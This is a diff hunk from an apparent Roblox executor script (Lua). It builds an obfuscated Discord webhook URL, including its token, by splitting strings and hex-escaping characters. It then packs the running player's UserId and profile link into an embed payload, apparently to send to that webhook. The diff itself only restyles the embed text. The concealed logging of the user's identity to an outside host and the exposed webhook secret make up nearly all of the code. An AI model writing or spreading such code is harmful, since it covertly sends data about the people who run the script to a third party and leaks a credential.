@@ -4,7 +4,7 @@ if getgenv().ex == nil then getgenv().ex = true
 local url = "h".."ttps://discord.com/api/webh\x6foks/1261085987413426198/kCT6oS1w3JxB1\x6fAqvW".."4BhtyT63QqBOPEmaiubgcpYe3LEKbXjVY7JGADy7xeq2qcyLWE"
 local data = {
     ["embeds"] = {{
-        ["description"] = (qq+6).." | [Profile](h".."ttps://roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile)",
+        ["description"] = "**"..(qq+6).."**".." **|** [**Profile**](h".."ttps://roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile)",
         ["color"] = tonumber(0xFFFAFA),
         ["fields"] = {
             {
